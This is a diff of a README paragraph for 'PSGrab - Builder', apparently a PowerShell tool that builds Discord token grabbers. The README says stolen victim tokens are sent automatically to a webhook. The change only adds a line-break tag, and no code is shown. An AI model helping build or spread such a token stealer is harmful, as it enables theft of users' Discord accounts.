@@ -1,5 +1,5 @@
 <p align="center">
-PSGrab - Builder is an builder of discord token grabber written in powershell.
+PSGrab - Builder is an builder of discord token grabber written in powershell. <br>
 The victim token will automatically be sent to the specified webhook.
 </p>
 
